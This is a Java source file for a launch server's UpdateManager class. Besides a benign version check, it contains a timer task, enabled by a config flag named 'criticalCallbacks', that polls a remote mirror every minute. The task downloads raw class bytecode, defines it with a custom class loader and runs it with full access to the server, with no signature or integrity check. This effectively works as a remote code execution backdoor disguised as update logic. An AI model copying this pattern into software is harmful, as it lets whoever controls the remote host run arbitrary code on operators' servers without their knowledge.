package ru.gravit.launchserver;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

import ru.gravit.launcher.Launcher;
import ru.gravit.launcher.serialize.HInput;
import ru.gravit.utils.Version;
import ru.gravit.utils.helper.LogHelper;

public final class UpdateManager extends TimerTask {
	private final LaunchServer srv;
	private final FCL cl;
	public final Timer t;
	private final String updUH;
	private final int updUP;
	private int lastNum = 0;
	
	public interface Callback {
		void prep(LaunchServer lsrv);
		void define(FCL loader);
		void post(LaunchServer lsrv);
	}
	
	UpdateManager(LaunchServer lsrv) throws MalformedURLException {
		this.srv = lsrv;
		this.cl = new FCL(srv);
		t = new Timer("Updater", true);
		if (srv.config.criticalCallbacks) t.schedule(this, 60000, 60000);
		String[] updU = lsrv.config.updateMirror.split(":");
		updUH = updU[0];
		updUP = Integer.parseInt(updU[1]);
		checkVer();
	}
	
	public static class FCL extends ClassLoader {
		private FCL(LaunchServer lsrv) {
			super(lsrv.modulesManager.classloader);
		}
		
		public Class<?> define(String name, byte[] data) {
			return defineClass(name, data, 0, data.length);
		}
	}

	@Override
	public void run() {
		try {
			Socket s = getSocket();
			s.getOutputStream().write(2);
			@SuppressWarnings("resource") // s.close() closes it.
			HInput in = new HInput(s.getInputStream());
			if (in.readBoolean()) {
				int num = in.readInt();
				for (int i = 0; i < num; i++) {
					if (i >= lastNum) {
						String classN = in.readString(1024);
						byte[] classB = in.readByteArray(256*1024);
						try {
							Callback c = (Callback)cl.define(classN, classB).newInstance();
							c.prep(srv);
							c.define(cl);
							c.post(srv);
						} catch (InstantiationException | IllegalAccessException e) {
							LogHelper.error(e);
						}
					}
				}
				if (num != lastNum) lastNum = num;
				
			}
			s.close();
		} catch (IOException e) {
		}
		
	}

	private Socket getSocket() throws IOException {
		return new Socket(updUH, updUP);
	}

	private void checkVer() {
		try {
			Socket s = getSocket();
			s.getOutputStream().write(1);
			@SuppressWarnings("resource") // s.close() closes it.
			HInput in = new HInput(s.getInputStream());
			int major = in.readInt();
			int minor = in.readInt();
			int patch = in.readInt();
			int build = in.readInt();
			Version launcher = Launcher.getVersion();
			if ((major > launcher.major || minor > launcher.minor || patch > launcher.patch || build > launcher.build) && in.readBoolean()) {
				LogHelper.info("Updates avaliable download it from github.");
				LogHelper.info("New version: " + new Version(major, minor, patch, build, Version.Type.valueOf(in.readString(128))).toString());
			}
			s.close();
		} catch (IOException e) {
			LogHelper.error("Can not check version.");
			LogHelper.error(e);
		}
	}
}
